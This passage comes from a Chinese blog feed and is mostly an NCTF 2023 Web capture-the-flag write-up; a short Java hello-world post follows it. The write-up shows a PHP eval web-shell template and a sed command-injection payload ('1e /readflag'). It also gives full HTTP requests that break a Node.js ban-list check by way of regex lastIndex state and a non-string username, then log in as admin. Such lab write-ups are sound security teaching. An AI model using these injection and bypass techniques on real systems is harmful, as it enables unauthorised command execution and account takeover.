class="line">    &#125;</span><br><span class="line">    <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;METHOD=<span class="subst">$method</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;你的method太复杂了！&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;KEY=<span class="subst">$key</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;你的key太复杂了！&quot;</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = -<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;sh generate.sh&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;生成失败了！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: download.php?file=<span class="subst">$filename</span>&amp;filename=<span class="subst">&#123;$_POST[&#x27;filename&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>generate.sh:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(<span class="built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 16)</span><br><span class="line"><span class="built_in">cp</span> template.php <span class="string">&quot;/tmp/<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;s/KEY/<span class="variable">$KEY</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/<span class="variable">$METHOD</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">realpath</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br></pre></td></tr></table></figure><p>template.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_METHOD</span>[<span class="string">&quot;KEY&quot;</span>]);</span><br></pre></td></tr></table></figure><p>这表明我们输入的请求方法和密钥分别充当了$METHOD和$KEY这两个环境变量的值,</p><p>因此可以尝试构造特殊的环境变量值,将sed命令闭合掉,注入getflag的命令</p><p>类似于sql注入,但这里是要将shell命令注入到generate.sh这个脚本中</p><p>官方给出的payload:  <code>/g;1e /readflag;s//</code></p><p>拼接后:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&quot;s/KEY//g;1e /readflag;s///g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br></pre></td></tr></table></figure><p>没用的知识: 事实上测试发现后面的&#x2F;&#x2F;g并不必要闭合,sed命令似乎并不会因部分语法错误而放弃整个输出</p><p>poc:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703679696943.png" alt="1703679696943"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703679714478.png" alt="1703679714478"></p><p><strong>注:</strong></p><p>sed命令可以在使用e来执行shell命令</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;e [command]</span><br></pre></td></tr></table></figure><p>此命令允许将 shell 命令的输入 通过管道传输到模式空间。如果没有参数，<code>e</code> 命令 将执行在模式空间中找到的命令， 并用输出替换模式空间；尾随换行符 将被抑制。</p><p>如果指定了参数，<code>e</code> 命令 会将其解释为命令并将其输出发送到输出流。 该命令可以跨多行运行，除最后一行外，其他所有行都以 反斜杠结尾。</p><p>在这两种情况下，如果要执行的命令包含 NUL 字符，则结果不确定。</p><p>请注意，与 <code>r</code> 命令不同，该命令的输出将立即打印；<code>r</code> 命令会将输出延迟到当前周期的末尾。</p></blockquote><p>这里的模式空间(pattern space)是sed命令的处理缓冲区</p><p>sed逐行将文件放入内存中,按照给出的 匹配和操作 逐行处理并输出到标准输出</p><p>一些测试:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703665212782.png" alt="1703665212782"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703665290161.png" alt="1703665290161"></p><h2 id="Wait-what"><a href="#Wait-what" class="headerlink" title="Wait what?"></a>Wait what?</h2><p>此题给出了后端的源代码作为附件,可以看见后端为node.js</p><p>之前尝试做过一些js原型链污染的题目,稍微了解过node.js,但是这里与原型链污染并没有什么关系</p><p>这题主要是对两个waf的绕过</p><p>先来看看catflag的路由,这也是我们最关心的地方</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/flag&quot;</span>, requireLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> flag = child_process.<span class="title function_">execSync</span>(<span class="string">&quot;cat flag&quot;</span>).<span class="title function_">toString</span>()</span><br><span class="line">    res.<span class="title function_">end</span>(flag)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;</span>)</span><br><span class="line">    res.<span class="title function_">on</span>(<span class="string">&quot;finish&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; process.<span class="title function_">exit</span>(<span class="number">0</span>) &#125;, <span class="number">1</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里使用了express框架,比较关注的是<code>requireLogin</code>,这里摘抄gpt对这个参数的解释</p><blockquote><p> <code>requireLogin</code>是一个中间件，用于确保用户已登录。这意味着只有经过身份验证的用户才能执行以下的代码块。</p></blockquote><p>那么这作为一个中间件,所有请求将需要经其处理</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//鉴权中间件</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">requireLogin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">    <span class="keyword">if</span> (!username || !password) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户名或密码不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> username !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> password !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户名或密码不合法&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="keyword">let</span> test1 = banned_users_regex.<span class="title function_">test</span>(username)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`使用正则<span class="subst">$&#123;banned_users_regex&#125;</span>匹配<span class="subst">$&#123;username&#125;</span>的结果为：<span class="subst">$&#123;test1&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">if</span> (test1) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于in关键字的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="keyword">let</span> test2 = (username <span class="keyword">in</span> banned_users)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`使用in关键字匹配<span class="subst">$&#123;username&#125;</span>的结果为：<span class="subst">$&#123;test2&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">if</span> (test2)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (username <span class="keyword">in</span> users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        <span class="title function_">next</span>()    #####</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要设法执行到<code>next()</code>才能通过鉴权</p><p>当然,要得到flag, 必须是以admin通过鉴权才行</p><p>阅读代码,需要完成两件事</p><ol><li>admin用户被ban,(被psuh进了<code>banned_users</code>)需要设法绕过限制</li><li>admin的密码不得而知,或许需要通过某种方法bypass</li></ol><p><strong>对于admin的封禁,用了两层waf</strong></p><p>分别是:</p><ol><li>每次请求前生成的正则来匹配封禁的username</li><li>通过<code>in</code>关键字来检查请求的username是否存在于<code>banned_users</code>中</li></ol><p>看了wp,绕过正则还是比较复杂(对我来说qwq)</p><p><strong>先看看in关键字实现的waf吧:</strong></p><p>在这里可以看见官方对<code>in</code>的一些解释(wp说的)</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in</a></p><p>可以看见</p><p><code>in</code>关键字实现的是 检查某属性是否存在于指定对象的原型链中</p><p>一个栗子:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703779559576.png" alt="1703779559576"></p><p>因此,这个waf实际上是没有起到什么作用的</p><p>接下来看看正则</p><p>wp中指出这里由于使用了全局匹配标志<code>g</code>使得下一次匹配的开始会紧接着上一次匹配的位置</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703827190486.png" alt="1703827190486"></p><p>但是每次请求前都会重新生成一个新的<code>banned_users_regex</code>时lastIndex归为0</p><p>但有趣的是,在每次生成时都使用了try catch关键字</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">build_banned_users_regex</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>我们就可以设法让其抛出异常来避免执行<code>build_banned_users_regex()</code>以重新生成<code>banned_users_regex</code></p><p>故而astIndex也就不会归为0</p><p><strong>该如何致使其抛出异常呢?</strong></p><p>不知道,问问gpt</p><blockquote><p>gpt:<br>在提供的代码中，<code>try</code> 块包含对 <code>build_banned_users_regex()</code> 函数的调用。<code>try</code> 块本身并不包含明确抛出异常的代码。然而，在 <code>build_banned_users_regex()</code> 函数或其调用的函数内部可能会抛出异常。</p><p>可能导致异常的情况：</p><ol><li><strong>banned_users 未定义或为空:</strong> 如果 <code>banned_users</code> 数组未定义或为空，<code>build_banned_users_regex()</code> 函数中的 <code>for (let username of banned_users)</code> 循环将不会运行，并且尝试访问未定义的元素可能导致异常。</li><li><strong>escapeRegExp 函数问题:</strong> 如果 <code>escapeRegExp</code> 函数未定义或存在问题，调用时可能会导致异常。</li><li><strong>正则表达式创建问题:</strong> 如果正则表达式字符串格式不正确，或包含在正则表达式中无效的字符，<code>new RegExp()</code> 构造函数可能会抛出异常。</li></ol><p>为了提供更具体的答案，您需要检查 <code>escapeRegExp</code> 函数的实现，并确保 <code>banned_users</code> 数组被正确定义并包含有效数据。如果其中任何元素缺失或不正确，可能会导致异常。</p></blockquote><p>可以看见,1,3所说的都不可能出现,因为正则表达式和banned_users在代码中已经生成好了</p><p>只剩下了<code>escapeRegExp 函数问题</code>,这也正是wp中所指出的</p><p>以下是代码中定义的<code>escapeRegExp()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escapeRegExp</span>(<span class="params">string</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> string.<span class="title function_">replace</span>(<span class="regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要使用__string__类型下的__replace属性__,如果传入了其他类型而找不到replace这个属性,那么就会报错,从而抛出异常</p><p>综上,我们依次要做:</p><ol><li>构造一个用户名将其封禁,使得每次生成regexp时抛出异常</li><li>首先鉴权admin使得lastIndex指向末尾</li><li>再次鉴权admin,正则匹配admin失败,成功通过鉴权</li></ol><p>poc0:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/register</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.26:8082</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.26:8082/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>37</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.26:8082</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;nacl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;nacl&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>poc1:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/ban_user</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.26:8082</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.26:8082/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.26:8082</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;nacl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;nacl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ban_username&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;toString&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>这里构造了一个ban_username为<code>&#123;&quot;toString&quot;:&quot;&quot;&#125;</code></p><p>刚开始有点疑惑,经过测试,发现这并不是必要的,我们也可以直接传入一个<code>&#123;&#125;</code>,这在js中会被认为是一个对象而不是一个string,从而使得上面提到的escapeRegExp(string)抛出一个错误(因为它只能传入一个string)</p><p>poc2:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.26:8082</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.26:8082/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>39</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.26:8082</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>首先发送一次poc1,之后发送两次poc2即可得到flag,当然,如你所见这里的admin存在弱密码</p><p>第二次发送poc2后回包中有flag:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Express</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 29 Dec 2023 12:06:12 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>49</span><br><span class="line"></span><br><span class="line"><span class="language-roboconf">flag&#123;<span class="attribute">https</span>://www<span class="variable">.youtube</span><span class="variable">.com</span>/watch?v=dQw4w9WgXcQ&#125;</span></span><br></pre></td></tr></table></figure><p>To be continued…</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NCTF 2023 Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一个Java程序</title>
      <link href="/2024/01/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AAJava%E7%A8%8B%E5%BA%8F/"/>
      <url>/2024/01/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AAJava%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-Code"><a href="#Java-Code" class="headerlink" title="Java Code"></a>Java Code</h1><p>java代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bug.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;hello,world!&quot;</span>);</span><br><span class="line">System.out.print(<span class="string">&quot;hello,world!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
